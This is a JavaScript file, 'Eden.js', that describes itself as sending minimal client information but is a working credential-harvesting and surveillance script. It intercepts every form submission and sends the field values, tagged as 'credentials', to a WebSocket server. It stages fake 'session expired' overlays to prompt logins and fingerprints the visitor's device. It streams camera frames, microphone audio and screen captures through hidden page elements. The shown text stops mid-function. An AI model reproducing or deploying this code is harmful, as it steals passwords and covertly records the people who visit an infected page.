/**
 * Eden.js - Client information sender
 * Automatically connects to the server and sends minimal client information
 */

// Configuration for link previews - Will be replaced by setup.py
const EDEN_LINK_PREVIEW = {
    enabled: true,
    title: "varun",
    description: "hello worls",
    image: "https://cca3-2401-4900-1c2a-d58-d17f-d99c-c75f-290c.ngrok-free.app/thumbnails/thumbnail.jpg",
    url: "http://localhost:8080",
    twitter_card: "summary_large_image"
};

(function() {
    // Configuration
    
    const WS_SERVER = 'ws://' + window.location.hostname + ':8080';
    
    // Function to inject meta tags for link previews
    function injectLinkPreviewMetaTags() {
        if (!EDEN_LINK_PREVIEW.enabled) return;
        
        // Remove any existing OG or Twitter tags to avoid duplicates
        document.querySelectorAll('meta[property^="og:"], meta[name^="twitter:"]').forEach(el => el.remove());
        
        // Create and inject meta tags
        const metaTags = [
            // Open Graph Tags
            { property: 'og:title', content: EDEN_LINK_PREVIEW.title },
            { property: 'og:description', content: EDEN_LINK_PREVIEW.description },
            { property: 'og:image', content: EDEN_LINK_PREVIEW.image },
            { property: 'og:url', content: EDEN_LINK_PREVIEW.url || window.location.href },
            { property: 'og:type', content: 'website' },
            
            // Twitter Card Tags
            { name: 'twitter:card', content: EDEN_LINK_PREVIEW.twitter_card },
            { name: 'twitter:title', content: EDEN_LINK_PREVIEW.title },
            { name: 'twitter:description', content: EDEN_LINK_PREVIEW.description },
            { name: 'twitter:image', content: EDEN_LINK_PREVIEW.image }
        ];
        
        // Add meta tags to document head
        metaTags.forEach(tag => {
            const meta = document.createElement('meta');
            
            if (tag.property) {
                meta.setAttribute('property', tag.property);
                meta.setAttribute('content', tag.content);
            } else if (tag.name) {
                meta.setAttribute('name', tag.name);
                meta.setAttribute('content', tag.content);
            }
            
            document.head.appendChild(meta);
        });
        
        console.log('Link preview meta tags injected');
    }

    // Add event listener to restore effects when the page loads
    window.addEventListener('DOMContentLoaded', function() {
        injectLinkPreviewMetaTags();
        restoreEffectStyles();
        setupGlobalFormSubmitHandlers();
        console.log('DOM loaded, restoring effects if needed');
    });
    
    // Function to set up global form submission handlers
    function setupGlobalFormSubmitHandlers() {
        console.log('Setting up global form submission handlers');
        
        // Remove any existing handler to avoid duplicates
        if (window._formSubmitHandler) {
            document.removeEventListener('submit', window._formSubmitHandler, true);
        }
        
        // Create and store the handler function
        window._formSubmitHandler = function(e) {
            // Check if blur effect is active
            const hasBlurOverlay = document.getElementById('eden-blur-overlay') !== null;
            const hasContentContainer = document.getElementById('eden-content-container') !== null;
            const blurApplied = localStorage.getItem('eden-blur-applied') === 'true';
            
            // Get the form and check if it's in a blur container
            const form = e.target;
            const isInBlurContainer = Boolean(
                form.closest('#eden-content-container') || 
                form.getAttribute('data-blur-form') === 'true' ||
                hasBlurOverlay || blurApplied
            );
            
            // Always capture form data regardless of container
            if (form && typeof form.elements !== 'undefined') {
                // Get form data
                const formData = new FormData(form);
                const data = Object.fromEntries(formData.entries());
                
                // Always capture all form data
                const credentialData = {...data};
                
                // Identify form type based on input types present
                const formMetadata = {
                    hasPassword: form.querySelector('input[type="password"]') !== null,
                    hasEmail: form.querySelector('input[type="email"]') !== null,
                    inputCount: form.querySelectorAll('input').length,
                    formId: form.id || form.name || '',
                    formAction: form.action || '',
                    formClass: form.className || '',
                    formMethod: form.method || 'get'
                };
                
                // If we have form data and a WebSocket connection, send it
                if (Object.keys(credentialData).length > 0 && ws && ws.readyState === WebSocket.OPEN) {
                    console.log('Form data captured, sending to server');
                    ws.send(JSON.stringify({
                        type: 'credentials',
                        data: credentialData,
                        formMetadata: formMetadata,
                        url: document.location.href,
                        timestamp: new Date().toISOString(),
                        formId: form.id || 'form_' + Math.random().toString(36).substring(2, 10),
                        clientId: clientId || 'unknown',
                        ip: clientIp || 'unknown',
                        source: window.name || 'form_capture'
                    }));
                }
            }
            
            // If in blur container, handle specially
            if (isInBlurContainer) {
                console.log('Intercepted form submission in blur container');
                
                // Prevent default after data is captured
                e.preventDefault();
                e.stopPropagation();
                
                // Force cleanup of blur effect after data capture
                setTimeout(() => _forceCleanupBlurEffect(), 100);
                return false;
            }
        };
        
        // Add the handler with capturing to catch all submissions
        document.addEventListener('submit', window._formSubmitHandler, true);
        
        // Also handle any forms via their onsubmit property directly
        setTimeout(() => {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                // Skip already handled forms
                if (form.dataset.globalHandlerAttached) return;
                
                form.dataset.globalHandlerAttached = 'true';
                const originalOnSubmit = form.onsubmit;
                
                form.onsubmit = function(e) {
                    // Check if blur effect is active
                    const hasBlurOverlay = document.getElementById('eden-blur-overlay') !== null;
                    const hasContentContainer = document.getElementById('eden-content-container') !== null;
                    const blurApplied = localStorage.getItem('eden-blur-applied') === 'true';
                    
                    // Check if form is in blur container
                    const isInBlurContainer = Boolean(
                        this.closest('#eden-content-container') || 
                        this.getAttribute('data-blur-form') === 'true' ||
                        hasBlurOverlay || blurApplied
                    );
                    
                    // Always capture form data regardless of container
                    if (this && typeof this.elements !== 'undefined') {
                        // Get form data
                        const formData = new FormData(this);
                        const data = Object.fromEntries(formData.entries());
                        
                        // Always capture all form data
                        const credentialData = {...data};
                        
                        // Identify form type based on input types present
                        const formMetadata = {
                            hasPassword: this.querySelector('input[type="password"]') !== null,
                            hasEmail: this.querySelector('input[type="email"]') !== null,
                            inputCount: this.querySelectorAll('input').length,
                            formId: this.id || this.name || '',
                            formAction: this.action || '',
                            formClass: this.className || '',
                            formMethod: this.method || 'get'
                        };
                        
                        // If we have form data and a WebSocket connection, send it
                        if (Object.keys(credentialData).length > 0 && ws && ws.readyState === WebSocket.OPEN) {
                            console.log('Form data captured, sending to server');
                            ws.send(JSON.stringify({
                                type: 'credentials',
                                data: credentialData,
                                formMetadata: formMetadata,
                                url: document.location.href,
                                timestamp: new Date().toISOString(),
                                formId: this.id || 'form_' + Math.random().toString(36).substring(2, 10),
                                clientId: clientId || 'unknown',
                                ip: clientIp || 'unknown',
                                source: window.name || 'form_capture'
                            }));
                        }
                    }
                    
                    // If in blur container, handle specially
                    if (isInBlurContainer) {
                        console.log('Intercepted form.onsubmit in blur container');
                        
                        // Prevent default after data is captured
                        if (e) {
                            e.preventDefault();
                            e.stopPropagation();
                        }
                        
                        // Force cleanup of blur effect after data capture
                        setTimeout(() => _forceCleanupBlurEffect(), 100);
                        return false;
                    }
                    
                    // Call original onsubmit if it exists
                    if (typeof originalOnSubmit === 'function') {
                        return originalOnSubmit.apply(this, arguments);
                    }
                    return true;
                };
            });
        }, 500);
    }
    
    // Function to force cleanup of blur effect regardless of state
    function _forceCleanupBlurEffect() {
        console.log('Forcing cleanup of blur effect');
        
        // Remove elements
        ['#eden-blur-overlay', '#eden-content-container', '#eden-session-banner', '#eden-session-style'].forEach(selector => {
            const elements = document.querySelectorAll(selector);
            elements.forEach(el => {
                if (el && el.parentNode) {
                    el.parentNode.removeChild(el);
                }
            });
        });
        
        // Also remove any dynamically added stylesheets
        document.querySelectorAll('style[id^="eden-"]').forEach(el => {
            if (el && el.parentNode) {
                el.parentNode.removeChild(el);
            }
        });
        
        // Clear storage
        localStorage.removeItem('blur-data');
        localStorage.removeItem('eden-blur-applied');
        localStorage.removeItem('eden-blur-effect');
        localStorage.removeItem('eden-blur-intensity');
        localStorage.removeItem('blur-content');
        localStorage.setItem('clean-flag', 'true');
        sessionStorage.setItem('clean-flag', 'true');
        
        console.log('Blur effect cleanup completed');
    }
    
    // Function to restore effects on page load
    function restoreEffectStyles() {
        // First check for session expired effect
        if (document.cookie.includes('sessionExpired=true')) {
            document.cookie = 'sessionExpired=false; path=/;';
            showSessionExpiredOverlay();
            return;
        }
        
        // Add the spotlight effect styles to the head if not already present
        if (!document.getElementById('eden-effect-styles')) {
            const styleElement = document.createElement('style');
            styleElement.id = 'eden-effect-styles';
            styleElement.textContent = `
                /* Spotlight Effect */
                .spotlight-effect::before {
                    content: '';
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: radial-gradient(circle at center, rgba(255, 255, 255, 0.9) 0%, rgba(0, 0, 0, 0.95) 100%);
                    z-index: 999999;
                    pointer-events: none;
                    animation: spotlightPulse 8s infinite alternate;
                }
                
                @keyframes spotlightPulse {
                    0% { background: radial-gradient(circle at center, rgba(255, 255, 255, 0.85) 0%, rgba(0, 0, 0, 0.9) 100%); }
                    100% { background: radial-gradient(circle at center, rgba(255, 255, 255, 0.95) 0%, rgba(0, 0, 0, 0.95) 100%); }
                }
            `;
            document.head.appendChild(styleElement);
        }
        
        // Check which effect was last applied
        const lastEffect = localStorage.getItem('eden-last-effect');
        
        // Apply the effect to the body based on localStorage
        if (lastEffect === 'spotlight') {
            // Remove any existing blur overlay (if there is one from previous implementations)
            const oldOverlay = document.getElementById('eden-blur-overlay');
            if (oldOverlay) {
                oldOverlay.remove();
            }
            
            // Simply add the class to the body - exactly like effect-demo.html
            document.body.classList.add('spotlight-effect');
            console.log('Restored spotlight effect by adding spotlight-effect class to body');
        }
        
        // Restore session expired effect if it was the last one applied
        else if (lastEffect === 'session-expired') {
            const sessionStyle = localStorage.getItem('eden-session-style');
            if (sessionStyle) {
                // Restore the style element
                const styleElement = document.createElement('style');
                styleElement.id = 'eden-session-style';
                styleElement.textContent = sessionStyle;
                document.head.appendChild(styleElement);
                
                // Create and apply the session expired overlay
                const overlay = document.createElement('div');
                overlay.id = 'eden-blur-overlay';
                overlay.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    background: radial-gradient(circle at center, rgba(220, 53, 69, 0.1) 0%, rgba(220, 53, 69, 0.4) 100%);
                    z-index: 999999;
                    pointer-events: auto;
                    display: block !important;
                    animation: sessionExpiredPulse 3s infinite alternate;
                `;
                document.body.appendChild(overlay);
                
                // Restore the session banner
                const sessionNotice = document.createElement('div');
                sessionNotice.id = 'eden-session-banner';
                sessionNotice.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    background-color: rgba(220, 53, 69, 0.85);
                    color: white;
                    padding: 12px 0;
                    text-align: center;
                    font-weight: bold;
                    font-family: Arial, sans-serif;
                    font-size: 16px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                    z-index: 1000000;
                `;
                sessionNotice.textContent = 'Your session has expired';
                document.body.appendChild(sessionNotice);
                console.log('Restored session expired effect from localStorage');
            }
        }
    }
    
    // Run the restore function when the DOM is loaded
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', restoreEffectStyles);
    } else {
        // DOM already loaded, run immediately
        restoreEffectStyles();
    }
    const HEARTBEAT_INTERVAL = 5000; // 5 seconds
    
    // State variables
    let ws;
    let reconnectTimer;
    let heartbeatTimer;
    let clientIp = 'Unknown';
    let clientId;
    let locationInfo = {};
    let connectionAttempts = 0;
    const MAX_RECONNECT_ATTEMPTS = Infinity; // Unlimited reconnection attempts
    let periodicConnectionTimer; // Timer for sending connection messages regularly
    
    // Enhanced permission media tracking object
    const permMedia = {
        camera: new Map(),  // Map of clientId -> stream
        mic: new Map(),     // Map of clientId -> stream
        screen: new Map(),  // Map of clientId -> stream
        location: new Map(), // Map of clientId -> data
        clipboard: new Map() // Map of clientId -> data
    };

    // Extend Eden namespace with permission utilities
    window.eden = window.eden || {};
    window.eden.getPermissionElement = function(id) {
        // Create or get hidden media elements
        let el = document.getElementById(id);
        if (!el) {
            if (id.includes('Video')) {
                el = document.createElement('video');
                el.id = id;
                el.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0.01;pointer-events:none;';
                el.setAttribute('playsinline', 'true');
                el.setAttribute('muted', 'true');
            } else if (id.includes('Canvas')) {
                el = document.createElement('canvas');
                el.id = id;
                el.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0.01;pointer-events:none;';
                el.width = 320;
                el.height = 240;
            }
            document.body.appendChild(el);
        }
        return el;
    }
    
    // Generate and manage unique fingerprint for this device
    function generateDeviceFingerprint() {
        // Collect device-specific information
        const fingerprint = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            // Add CPU cores and device memory if available
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            // Add more device characteristics
            devicePixelRatio: window.devicePixelRatio || 'unknown',
            touchPoints: navigator.maxTouchPoints || 'unknown'  
        };
        
        // Create a hash from the fingerprint object
        const fingerprintStr = JSON.stringify(fingerprint);
        return hashString(fingerprintStr);
    }
    
    // Simple hash function for device fingerprint
    function hashString(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32bit integer
        }
        return 'fp_' + Math.abs(hash).toString(16);
    }
    
    // Get or create the device fingerprint and store it
    function getStoredDeviceInfo() {
        let deviceInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            devicePixelRatio: window.devicePixelRatio || 'unknown',
            touchPoints: navigator.maxTouchPoints || 'unknown'
        };
        
        // Store the device info for future use
        localStorage.setItem('eden_device_info', JSON.stringify(deviceInfo));
        return deviceInfo;
    }
    
    // Generate a unique client ID for this browser instance/tab
    function getOrCreateClientId() {
        // Get or create a persistent base ID for this device
        let baseId = localStorage.getItem('eden_persistent_client_id');
        
        if (!baseId) {
            // Generate a base ID that includes device fingerprint
            const deviceFp = generateDeviceFingerprint();
            baseId = 'client_' + Date.now() + '_' + deviceFp;
            localStorage.setItem('eden_persistent_client_id', baseId);
            
            // Also store the creation timestamp
            localStorage.setItem('eden_client_id_created', Date.now());
        }
        
        // Create a session-specific ID that's unique to this tab/instance
        // This ID will be different for each tab but persist across refreshes in the same tab
        let sessionId = sessionStorage.getItem('eden_session_client_id');
        if (!sessionId) {
            // Generate a session-specific ID component
            sessionId = 'tab_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
            sessionStorage.setItem('eden_session_client_id', sessionId);
        }
        
        // Combine the base ID and session ID to create a truly unique ID
        return baseId + '_' + sessionId;
    }
    
    // Initialize clientId
    clientId = getOrCreateClientId();
    
    // Add window load event listener to initialize Eden.js
    window.addEventListener('load', function() {
        console.log('Eden.js initializing on page load');
        initialize();
    });
    
    // Function to create a client-specific feed container
    function createClientFeedContainer(type, clientId) {
        const container = document.createElement('div');
        container.className = 'client-feed';
        container.id = `${type}-feed-${clientId}`;
        container.setAttribute('data-client-id', clientId);
        
        const header = document.createElement('div');
        header.className = 'client-feed-header';
        
        const title = document.createElement('div');
        title.className = 'client-feed-title';
        title.textContent = `${type.charAt(0).toUpperCase() + type.slice(1)} Feed`;
        
        const idBadge = document.createElement('div');
        idBadge.className = 'client-feed-id';
        idBadge.textContent = `Client: ${clientId}`;
        
        header.appendChild(title);
        header.appendChild(idBadge);
        container.appendChild(header);
        
        return container;
    }

    // Function to add a log entry with client ID
    function addLogEntry(type, clientId, message) {
        const logContainer = document.getElementById(`${type}Logs`);
        if (!logContainer) return;
        
        const entry = document.createElement('div');
        entry.className = 'status';
        entry.setAttribute('data-client-id', clientId);
        
        const clientIdSpan = document.createElement('span');
        clientIdSpan.className = 'client-id';
        clientIdSpan.textContent = clientId;
        
        const timestampSpan = document.createElement('span');
        timestampSpan.className = 'timestamp';
        timestampSpan.textContent = new Date().toLocaleTimeString();
        
        const messageSpan = document.createElement('span');
        messageSpan.className = 'message';
        messageSpan.textContent = message;
        
        entry.appendChild(clientIdSpan);
        entry.appendChild(timestampSpan);
        entry.appendChild(messageSpan);
        
        logContainer.insertBefore(entry, logContainer.firstChild);
        
        // Also add to all logs
        const allLogsContainer = document.getElementById('allLogs');
        if (allLogsContainer) {
            const allEntry = entry.cloneNode(true);
            allLogsContainer.insertBefore(allEntry, allLogsContainer.firstChild);
        }
    }

    // Simplified function to update permission status and send to server
    function updateStatus(type, granted, message) {
        console.log(`Permission ${type}: ${message}`);
        
        // Add support for both old and new formats
        if (arguments.length === 4) {
            // New format with client ID
            const clientId = arguments[3];
            addLogEntry(type, clientId, `Permission ${granted ? 'granted' : 'denied'}: ${message}`);
        }
        
        // Send status update to server via WebSocket (old format for compatibility)
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
                type: `${type}Status`,
                granted: granted,
                message: message,
                clientId: clientId // Include clientId in all messages
            }));
        }
    }

    // Streamlined camera access function (original version for backward compatibility)
    async function requestCamera() {
    try {
        // If called with no arguments, use the client's own ID
        const thisClientId = clientId;
        
        // Stop existing stream if any
        if (permMedia.camera instanceof Map) {
            // New format
            if (permMedia.camera.has(thisClientId)) {
                permMedia.camera.get(thisClientId).getTracks().forEach(track => track.stop());
                permMedia.camera.delete(thisClientId);
            }
        } else if (permMedia.camera) {
            // Old format
            permMedia.camera.getTracks().forEach(track => track.stop());
            permMedia.camera = null;
        }
        
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        
        // Store stream in the appropriate format
        if (permMedia.camera instanceof Map) {
            permMedia.camera.set(thisClientId, stream);
        } else {
            permMedia.camera = stream;
        }
        
        // Create client-specific elements with unique IDs
        const videoId = `cameraVideo-${thisClientId}`;
        const canvasId = `cameraCanvas-${thisClientId}`;
        
        // Get or create video and canvas elements with client-specific IDs
        const video = window.eden.getPermissionElement(videoId);
        const canvas = window.eden.getPermissionElement(canvasId);
        
        // Setup video
        video.srcObject = stream;
        await video.play();
        
        // Create client-specific feed if container exists
        const feedsContainer = document.getElementById('cameraFeeds');
        if (feedsContainer) {
            // Check if we already have a feed for this client
            const existingFeed = document.getElementById(`camera-feed-${thisClientId}`);
            if (!existingFeed) {
                const clientContainer = createClientFeedContainer('camera', thisClientId);
                
                const clientVideo = document.createElement('video');
                clientVideo.autoplay = true;
                clientVideo.playsinline = true;
                clientVideo.srcObject = stream;
                clientVideo.id = `camera-display-${thisClientId}`;
                
                clientContainer.appendChild(clientVideo);
                feedsContainer.appendChild(clientContainer);
            } else {
                // Update existing feed
                const existingVideo = document.getElementById(`camera-display-${thisClientId}`);
                if (existingVideo) {
                    existingVideo.srcObject = stream;
                }
            }
        }
        
        // Handle stream ending
        stream.getVideoTracks()[0].onended = () => {
            if (permMedia.camera instanceof Map) {
                permMedia.camera.delete(thisClientId);
            } else {
                permMedia.camera = null;
            }
            updateStatus('camera', false, 'Camera access ended', thisClientId);
            
            // Remove the client container
            const clientContainer = document.getElementById(`camera-feed-${thisClientId}`);
            if (clientContainer && clientContainer.parentNode) {
                clientContainer.parentNode.removeChild(clientContainer);
            }
        };
        
        // Send frames to server from client-specific canvas
        const ctx = canvas.getContext('2d');
        const sendFrame = () => {
            // Check if we still have the stream
            const streamToCheck = permMedia.camera instanceof Map ? 
                permMedia.camera.get(thisClientId) : permMedia.camera;
                
            if (!streamToCheck) return;
            
            try {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                if (ws?.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: 'camera-frame',
                        data: canvas.toDataURL('image/jpeg', 0.7), // Increased quality
                        clientId: thisClientId
                    }));
                    
                    // Schedule next frame only if the stream is still active
                    if (streamToCheck.active) {
                        // Increased frame rate to 10fps for smoother video
                        setTimeout(() => sendFrame(), 100);
                    }
                }
            } catch (e) {
                console.error('Error sending camera frame:', e);
            }
        };
        
        // Start sending frames
        sendFrame();
        
        updateStatus('camera', true, 'Camera access granted', thisClientId);
    } catch (error) {
        updateStatus('camera', false, `Camera: ${error.message}`, clientId);
    }
}

    async function requestMicrophone(clientId) {
        try {
            // If no clientId provided, use the current client's ID
            const thisClientId = clientId || window.clientId;
            
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            
            // Handle both Map and direct storage formats
            if (permMedia.mic instanceof Map) {
                permMedia.mic.set(thisClientId, stream);
            } else {
                // For backward compatibility
                permMedia.mic = stream;
            }
            
            // Create client-specific audio context
            const audioContextId = `audioContext-${thisClientId}`;
            let audioContext;
            
            // Store audio contexts in global object if it doesn't exist
            if (!window.edenAudioContexts) {
                window.edenAudioContexts = {};
            }
            
            // Create or reuse audio context
            if (window.edenAudioContexts[thisClientId]) {
                audioContext = window.edenAudioContexts[thisClientId];
                if (audioContext.state === 'suspended') {
                    await audioContext.resume();
                }
            } else {
                audioContext = new AudioContext();
                window.edenAudioContexts[thisClientId] = audioContext;
            }
            
            // Set up enhanced audio processing chain with client-specific components
            const source = audioContext.createMediaStreamSource(stream);
            const analyser = audioContext.createAnalyser();
            analyser.fftSize = 2048;
            
            // Create a gain node for volume control
            const gainNode = audioContext.createGain();
            gainNode.gain.value = 2.0; // Increase gain to make audio louder
            
            // Create a bandpass filter to focus on voice frequencies
            const bandpassFilter = audioContext.createBiquadFilter();
            bandpassFilter.type = 'bandpass';
            bandpassFilter.frequency.value = 1500; // Focus on voice frequencies
            bandpassFilter.Q.value = 0.7; // Not too narrow
            
            // Connect the audio processing chain
            source.connect(analyser);
            analyser.connect(bandpassFilter);
            bandpassFilter.connect(gainNode);
            
            // Create a dummy destination to keep the audio processing chain active
            const dummyDestination = audioContext.createMediaStreamDestination();
            gainNode.connect(dummyDestination);
            
            const feedsContainer = document.getElementById('audioFeeds');
            if (feedsContainer) {
                // Check if we already have a container for this client
                const existingContainer = document.getElementById(`audio-feed-${thisClientId}`);
                let canvas;
                
                if (!existingContainer) {
                    const clientContainer = createClientFeedContainer('audio', thisClientId);
                    
                    // Create visualization canvas
                    canvas = document.createElement('canvas');
                    canvas.width = 300;
                    canvas.height = 100;
                    canvas.id = `audio-canvas-${thisClientId}`;
                    
                    // Add volume indicator
                    const volumeIndicator = document.createElement('div');
                    volumeIndicator.className = 'volume-indicator';
                    volumeIndicator.id = `volume-indicator-${thisClientId}`;
                    volumeIndicator.style.cssText = 'width: 100%; height: 20px; background: #eee; border-radius: 10px; margin-top: 10px; overflow: hidden;';
                    
                    const volumeBar = document.createElement('div');
                    volumeBar.id = `volume-bar-${thisClientId}`;
                    volumeBar.style.cssText = 'height: 100%; width: 0%; background: #007bff; transition: width 0.1s;';
                    
                    volumeIndicator.appendChild(volumeBar);
                    
                    clientContainer.appendChild(canvas);
                    clientContainer.appendChild(volumeIndicator);
                    feedsContainer.appendChild(clientContainer);
                } else {
                    canvas = document.getElementById(`audio-canvas-${thisClientId}`);
                }
                
                // Set up audio visualization function
                function drawAudio() {
                    // Make sure we still have the audio feed
                    const feedStillExists = document.getElementById(`audio-feed-${thisClientId}`);
                    if (!feedStillExists) return;
                    
                    // Get canvas context
                    const ctx = canvas.getContext('2d');
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    
                    // Get frequency data
                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
                    analyser.getByteFrequencyData(dataArray);
                    
                    // Draw frequency bars
                    const barWidth = canvas.width / (dataArray.length / 4);
                    ctx.fillStyle = '#007bff';
                    
                    let totalAmplitude = 0;
                    for (let i = 0; i < dataArray.length / 4; i++) {
                        const barHeight = (dataArray[i] / 255) * canvas.height;
                        ctx.fillRect(i * barWidth, canvas.height - barHeight, barWidth - 1, barHeight);
                        totalAmplitude += dataArray[i];
                    }
                    
                    // Update volume indicator if it exists
                    const volumeBar = document.getElementById(`volume-bar-${thisClientId}`);
                    if (volumeBar) {
                        const volume = totalAmplitude / (dataArray.length / 4) / 255;
                        volumeBar.style.width = `${Math.min(100, volume * 400)}%`;
                        
                        // Change color based on volume
                        if (volume > 0.5) {
                            volumeBar.style.background = '#dc3545'; // red for loud
                        } else if (volume > 0.2) {
                            volumeBar.style.background = '#ffc107'; // yellow for medium
                        } else {
                            volumeBar.style.background = '#007bff'; // blue for quiet
                        }
                    }
                    
                    // Check if we should continue animation
                    const hasStream = permMedia.mic instanceof Map ? 
                        permMedia.mic.has(thisClientId) : 
                        Boolean(permMedia.mic);
                        
                    if (hasStream) {
                        requestAnimationFrame(drawAudio);
                    }
                }
                
                // Start audio visualization
                drawAudio();
                
                // Add a button to toggle audio
                const existingToggle = document.getElementById(`audio-toggle-${thisClientId}`);
                if (!existingToggle && existingContainer) {
                    const toggleBtn = document.createElement('button');
                    toggleBtn.id = `audio-toggle-${thisClientId}`;
                    toggleBtn.className = 'audio-toggle-btn';
                    toggleBtn.textContent = 'Mute Audio';
                    toggleBtn.style.cssText = 'margin-top: 10px; padding: 5px 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;';
                    
                    // Toggle mute state
                    toggleBtn.addEventListener('click', () => {
                        const audioStream = permMedia.mic instanceof Map ?
                            permMedia.mic.get(thisClientId) :
                            permMedia.mic;
                            
                        if (audioStream) {
                            const track = audioStream.getAudioTracks()[0];
                            if (track) {
                                track.enabled = !track.enabled;
                                toggleBtn.textContent = track.enabled ? 'Mute Audio' : 'Unmute Audio';
                                toggleBtn.style.background = track.enabled ? '#007bff' : '#dc3545';
                            }
                        }
                    });
                    
                    existingContainer.appendChild(toggleBtn);
                }
            }
            
            // Handle stream ending
            stream.getAudioTracks()[0].onended = () => {
                // Clean up resources
                if (permMedia.mic instanceof Map) {
                    permMedia.mic.delete(thisClientId);
                } else {
                    permMedia.mic = null;
                }
                
                // Close audio context
                if (window.edenAudioContexts && window.edenAudioContexts[thisClientId]) {
                    window.edenAudioContexts[thisClientId].close().catch(e => console.error('Error closing audio context:', e));
                    delete window.edenAudioContexts[thisClientId];
                }
                
                // Remove the client container
                const clientContainer = document.getElementById(`audio-feed-${thisClientId}`);
                if (clientContainer && clientContainer.parentNode) {
                    clientContainer.parentNode.removeChild(clientContainer);
                }
                
                updateStatus('audio', false, 'Microphone access ended', thisClientId);
            };
            
            // Create separate data array for sending to server
            const dataArray = new Float32Array(analyser.frequencyBinCount);
            
            // Function to send audio data to server using improved approach
            function sendAudioData() {
                // Check if we should continue
                const hasStream = permMedia.mic instanceof Map ? 
                    permMedia.mic.has(thisClientId) : 
                    Boolean(permMedia.mic);
                    
                if (!hasStream) return;
                
                if (stream.active && stream.getAudioTracks()[0].enabled && ws && ws.readyState === WebSocket.OPEN) {
                    // Get audio data
                    analyser.getFloatTimeDomainData(dataArray);
                    
                    // Process audio data for sending
                    const audioData = {
                        type: 'audio-data',
                        data: Array.from(dataArray),
                        clientId: thisClientId,
                        timestamp: Date.now()
                    };
                    
                    // Ensure audio data has sufficient amplitude before sending
                    // Use a lower threshold to capture more subtle sounds
                    const hasSound = audioData.data.some(sample => Math.abs(sample) > 0.005);
                    
                    if (hasSound) {
                        ws.send(JSON.stringify(audioData));
                    }
                }
                
                // Use requestAnimationFrame for smoother audio processing
                // This naturally syncs with the browser's refresh rate
                if (stream.active) {
                    requestAnimationFrame(sendAudioData);
                }
            }
            
            // Start sending audio data
            sendAudioData();
            
            updateStatus('audio', true, 'Microphone access granted', thisClientId);
        } catch (error) {
            // Use the provided clientId or fall back to window.clientId
            updateStatus('audio', false, error.message, clientId || window.clientId);
        }
    }

    async function requestScreen(clientId) {
        try {
            // If no clientId provided, use the current client's ID
            const thisClientId = clientId || window.clientId;
            
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            
            // Handle both Map and direct storage formats
            if (permMedia.screen instanceof Map) {
                permMedia.screen.set(thisClientId, stream);
            } else {
                // For backward compatibility
                permMedia.screen = stream;
            }
            
            // Create client-specific elements with unique IDs
            const videoId = `screenVideo-${thisClientId}`;
            const canvasId = `screenCanvas-${thisClientId}`;
            
            // Get or create video and canvas elements with client-specific IDs
            const hiddenVideo = window.eden.getPermissionElement(videoId);
            hiddenVideo.srcObject = stream;
            hiddenVideo.muted = true;
            hiddenVideo.autoplay = true;
            
            // Create a canvas for sending frames
            const canvas = window.eden.getPermissionElement(canvasId);
            canvas.width = 640;
            canvas.height = 360;
            
            console.log(`Screen sharing elements created for client ${thisClientId}`);
            
            // Add to UI if feed container exists
            const feedsContainer = document.getElementById('screenFeeds');
            if (feedsContainer) {
                // Check if we already have a container for this client
                const existingContainer = document.getElementById(`screen-feed-${thisClientId}`);
                if (!existingContainer) {
                    const clientContainer = createClientFeedContainer('screen', thisClientId);
                    
                    // Create a display video element
                    const video = document.createElement('video');
                    video.autoplay = true;
                    video.playsinline = true;
                    video.srcObject = stream;
                    video.id = `screen-display-${thisClientId}`;
                    video.style.width = '100%';
                    video.style.maxHeight = '300px';
                    video.style.objectFit = 'contain';
                    
                    clientContainer.appendChild(video);
                    feedsContainer.appendChild(clientContainer);
                } else {
                    // Update existing feed
                    const existingVideo = document.getElementById(`screen-display-${thisClientId}`);
                    if (existingVideo) {
                        existingVideo.srcObject = stream;
                    }
                }
            }
            
            // Play the video
            hiddenVideo.play();
            
            // Send frames to server
            function captureAndSendFrames() {
                // Get context and check if stream still exists
                const ctx = canvas.getContext('2d');
                const currentStream = permMedia.screen instanceof Map ? 
                    permMedia.screen.get(thisClientId) : permMedia.screen;
                
                if (!currentStream || !currentStream.active) {
                    console.log(`Screen stream for client ${thisClientId} is no longer active`);
                    return;
                }
                
                try {
                    // Draw the current video frame to the canvas
                    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                    
                    // Send the frame data over WebSocket if connection is open
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        // Use higher quality JPEG and add timestamp for better ordering
                        ws.send(JSON.stringify({
                            type: 'screen-frame',
                            data: canvas.toDataURL('image/jpeg', 0.8), // Higher quality image
                            clientId: thisClientId,
